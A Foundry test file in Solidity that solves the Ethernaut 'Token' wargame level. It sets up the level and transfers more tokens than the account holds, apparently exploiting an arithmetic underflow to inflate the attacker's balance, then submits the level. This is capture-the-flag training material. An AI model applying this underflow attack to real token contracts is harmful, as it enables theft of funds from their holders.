pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/levels/Token/TokenFactory.sol";
import "../src/core//Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        uint balance = ethernautToken.balanceOf(eoaAddress);

        console.log("Balance before: %s", balance);

        ethernautToken.transfer(address(0x1), 1000);

        balance = ethernautToken.balanceOf(eoaAddress);

         console.log("Balance after: %s", balance);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}